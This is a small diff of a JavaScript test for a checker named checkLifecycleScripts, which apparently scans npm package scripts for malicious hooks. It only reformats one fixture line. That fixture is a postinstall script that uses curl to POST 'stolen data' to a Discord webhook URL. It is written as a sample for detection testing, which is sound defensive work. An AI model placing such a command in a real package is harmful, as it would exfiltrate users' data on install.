@@ -211,8 +211,7 @@ describe("checkLifecycleScripts", () => {
   it("detects Discord webhook in scripts", () => {
     const packageJson = {
       scripts: {
-        postinstall:
-          "curl -X POST https://discord.com/api/webhooks/123/abc -d 'stolen data'",
+        postinstall: "curl -X POST https://discord.com/api/webhooks/123/abc -d 'stolen data'",
       },
     };
 
